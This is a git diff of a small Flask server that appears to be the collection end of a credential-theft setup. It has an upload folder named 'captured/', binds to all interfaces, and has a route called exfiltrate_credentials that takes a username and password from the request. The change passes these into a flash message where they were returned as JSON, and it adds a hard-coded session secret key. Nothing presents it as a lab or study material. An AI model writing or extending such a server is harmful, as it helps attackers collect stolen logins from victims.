@@ -1,9 +1,14 @@
-from flask import Flask, request, redirect, url_for, jsonify, render_template
+from flask import Flask, request, redirect, url_for, jsonify, render_template, flash
+from flask_session import Session
 from werkzeug.utils import secure_filename
 import os
 
 # Initialise Flask app
 app = Flask(__name__)
+app.secret_key = 'cure51'  # Replace with a secure secret key
+
+# Initialize the session
+Session(app)
 
 # Folder to upload in windows
 UPLOAD_FOLDER = 'captured/'
@@ -105,13 +110,10 @@ def exfiltrate_credentials():
     username = request.args.get('username')
     password = request.args.get('password')
     if username and password:
-        response = {
-            'username': username,
-            'password': password
-        }
-        return jsonify(response), 200
+        flash(f"Username: {username}, Password: {password}", category="success")
+        return '', 200
     else:
-        return "Missing username or password", 400
+        return '', 400
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
